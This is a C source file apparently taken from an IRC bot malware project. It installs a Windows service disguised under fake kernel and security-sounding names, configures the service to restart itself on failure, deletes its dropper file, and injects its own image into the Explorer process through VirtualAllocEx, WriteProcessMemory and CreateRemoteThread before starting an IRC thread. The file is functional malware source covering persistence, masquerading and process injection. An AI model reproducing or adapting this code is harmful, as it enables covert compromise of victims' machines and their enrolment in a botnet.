#include "shared.h"

/////////////////
// config here //
/////////////////

char cfg_servicename[] = "Kernel DbGSys";
char cfg_servicedisplayname[] = "DSTS KDbgMon";
char cfg_servicedesc[] = "API SecSystem";

/////////////////
// config ends //
/////////////////

SC_HANDLE				scm;
SERVICE_STATUS			ss; 
SERVICE_STATUS_HANDLE	ssh;
HANDLE					stopServiceEvent = 0;


void WINAPI ServiceControlHandler(DWORD controlCode)
{
    switch (controlCode)
    {
        case SERVICE_CONTROL_INTERROGATE:
            break;

        case SERVICE_CONTROL_SHUTDOWN:
        case SERVICE_CONTROL_STOP:
            ss.dwCurrentState = SERVICE_STOP_PENDING;
            SetServiceStatus(ssh, &ss);

            SetEvent(stopServiceEvent);
            return;

        case SERVICE_CONTROL_PAUSE:
            break;

        case SERVICE_CONTROL_CONTINUE:
            break;

        default:
            if (controlCode >= 128 && controlCode <= 255)
                // user defined control code
                break;
            else
                // unrecognised control code
                break;
    }

    SetServiceStatus(ssh, &ss);
}

DWORD WINAPI RemoteThread(PVOID pParam)
{
//LoadLibs We Use
LoadLibrary("kernel32.dll");
LoadLibrary("user32.dll");

//MessageBox, Duh..
#ifndef NO_DEBUG
//MessageBox(0, "SuCCESS!", "Injection Successful", MB_OK);
#endif
IRC_Thread(NULL);
return 0;
}

//Original Code By akcom (<3), Modified By D-oNe
bool InjectCode(HANDLE hProcess, LPTHREAD_START_ROUTINE lpCodeToInject)
{
//Variables
DWORD dwThread, dwSize, dwWritten;
PBYTE pbModule;
LPVOID lpBuffer;
HANDLE hThread;
//Set Some Variables
pbModule = (PBYTE)GetModuleHandle(0);
dwSize = ((PIMAGE_NT_HEADERS)(pbModule+((PIMAGE_DOS_HEADER)pbModule)->e_lfanew))->OptionalHeader.SizeOfImage;
//Magic \o/
VirtualFreeEx(hProcess, pbModule, 0, MEM_RELEASE);
lpBuffer = VirtualAllocEx(hProcess, pbModule, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (!lpBuffer) return FALSE;
if (!WriteProcessMemory(hProcess, lpBuffer, pbModule, dwSize, &dwWritten)) return FALSE;
hThread = CreateRemoteThread(hProcess, 0, 0, lpCodeToInject, pbModule, 0, &dwThread);
if (!hThread) return FALSE;
//Close Handles
CloseHandle(hThread);
CloseHandle(hProcess);
return TRUE;
}

//Made By drocon (<3) Gets PID By Processname
DWORD GetPID(char *szExe)
{
//Variables
HANDLE hProcessSnap;
PROCESSENTRY32 pe32;
//Set The Variables
hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
pe32.dwSize = sizeof(PROCESSENTRY32);
if (!Process32First(hProcessSnap, &pe32))
{
CloseHandle(hProcessSnap);
return 0;
}
//Loop Through Processnames In Hunt Of The One We Are Looking For
do
{
if (lstrcmpi(pe32.szExeFile, szExe) == 0)
{
return (pe32.th32ProcessID);
break;
}
}
while (Process32Next(hProcessSnap, &pe32));
//Close Handles
CloseHandle(hProcessSnap);
return 0;
}

void EntryPoint()
{
//Variables
HANDLE hProcess;
//Get PID by Application Classname
//hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetPID("explorer.exe"));
//Variables
// HANDLE hProcess;
DWORD dwPID;
//Get PID by Application Classname
GetWindowThreadProcessId(FindWindow("Shell_TrayWnd", NULL), &dwPID);

hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
//Inject
//if (!InjectCode(hProcess, RemoteThread)) MessageBox(0, "ERROR!", "ERROR!", MB_ICONERROR);
IRC_Thread(NULL);
//Exit app
//ExitProcess(0);
}
DWORD WINAPI SC_Thread(LPVOID param)
{
EntryPoint();
	//Thread_Start(&IRC_Thread, NULL, TRUE);
	ExitThread(0);
}


int SC_Main(int argc, char *argv[])
{
	ss.dwServiceType			 = SERVICE_WIN32; 
	ss.dwCurrentState			 = SERVICE_START_PENDING; 
	ss.dwControlsAccepted		 = SERVICE_ACCEPT_SHUTDOWN;
	ss.dwWin32ExitCode			 = 0; 
	ss.dwServiceSpecificExitCode = 0; 
	ss.dwCheckPoint				 = 0; 
	ss.dwWaitHint				 = 0; 
	ssh = RegisterServiceCtrlHandler(cfg_servicename, ServiceControlHandler); 

    ss.dwCurrentState       = SERVICE_RUNNING; 
    ss.dwCheckPoint         = 0; 
    ss.dwWaitHint           = 0; 
	SetServiceStatus(ssh, &ss);

	if (argc > 1 && argv[1] != NULL)
	{
		Sleep(2000);
		DeleteFile(argv[1]);
	}

	Thread_Start(&SC_Thread, NULL, TRUE);
	return 0;
}


void SC_Run(const char *filetomelt) 
{ 
    SC_HANDLE		service; 
	
	if (!(scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)))
		return;

	if (!(service = OpenService(scm, cfg_servicename, SERVICE_ALL_ACCESS)))
		return;

	if (filetomelt == NULL)
		StartService(service, 0, NULL);
	else
		StartService(service, 1, &filetomelt);

	CloseServiceHandle(scm);
    CloseServiceHandle(service);
}


BOOL SC_Reconfigure(LPSTR lpDesc) 
{ 
    SC_HANDLE					service;
	SC_LOCK						sclLock; 
	SC_ACTION					scBuf;
	LPQUERY_SERVICE_LOCK_STATUS lpqslsBuf; 
	SERVICE_DESCRIPTION			sdBuf;
	SERVICE_FAILURE_ACTIONS		sfBuf;
	DWORD						dwBytesNeeded; 
	BOOL						bSuccess = TRUE;

	if (!(scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS)))
		return FALSE;

	if (!(service = OpenService(scm, cfg_servicename, SERVICE_ALL_ACCESS)))
		return FALSE;
	
	if (!(sclLock = LockServiceDatabase(scm))) 
	{
		if (GetLastError() != ERROR_SERVICE_DATABASE_LOCKED) 
			return FALSE;

		lpqslsBuf = (LPQUERY_SERVICE_LOCK_STATUS) LocalAlloc(LPTR, sizeof(QUERY_SERVICE_LOCK_STATUS) + 256); 
		if (lpqslsBuf == NULL) 
			return FALSE;
 
		if (!QueryServiceLockStatus(scm, lpqslsBuf, sizeof(QUERY_SERVICE_LOCK_STATUS) + 256, &dwBytesNeeded)) 
			return FALSE;

		LocalFree(lpqslsBuf); 
	}

	scm = OpenService(scm, cfg_servicename, SERVICE_CHANGE_CONFIG);
	if (service == NULL) 
		return FALSE;

	scBuf.Delay = 3000;
	scBuf.Type = SC_ACTION_RESTART;

	sfBuf.lpsaActions = &scBuf;
	sfBuf.cActions = 1;
	sfBuf.lpCommand = 0;
	sfBuf.lpRebootMsg = 0;
	sfBuf.dwResetPeriod = 10;

	if (!ChangeServiceConfig2(service, SERVICE_CONFIG_FAILURE_ACTIONS, &sfBuf))
		bSuccess = FALSE;

	sdBuf.lpDescription = lpDesc;

	if (!ChangeServiceConfig2(service, SERVICE_CONFIG_DESCRIPTION, &sdBuf))
		bSuccess = FALSE;

	UnlockServiceDatabase(sclLock); 

	CloseServiceHandle(service);
	CloseServiceHandle(scm);

	return bSuccess;
}


int SC_Install(char *svcpath, char *current)
{
	DWORD		le;
	SC_HANDLE	service;
    char		path[MAX_PATH];

	sprintf(path, "\"%s\"", svcpath);

	if (!(scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)))
		return 0;

	if (!(service = CreateService(scm, cfg_servicename, cfg_servicedisplayname, SERVICE_ALL_ACCESS, 
		SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, 
		path, NULL, NULL, NULL, NULL, NULL)))
	{
		le = GetLastError();

		if (le == ERROR_DUPLICATE_SERVICE_NAME || le == ERROR_SERVICE_EXISTS)
		{
			if (!lstrcmpi(svcpath, current))
				SC_Run(NULL);
			else
				SC_Run(current);
		}
		else
			return 0;
	}
	else
	{
		SC_Reconfigure(cfg_servicedesc);
		SC_Run(current);
	}

	CloseServiceHandle(service);
	CloseServiceHandle(scm);
	
	return 0;
}


void SC_StopOrUninstall(BOOL uninstall)
{
#ifndef DEBUG
	SC_HANDLE		scm;
	SC_HANDLE		service;

	scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	service = OpenService(scm, cfg_servicename, SERVICE_ALL_ACCESS);

	if (uninstall)
		DeleteService(service);
	else
	{
		ControlService(service, SERVICE_CONTROL_STOP, &ss);
		Sleep(3600000);
	}
#endif
}
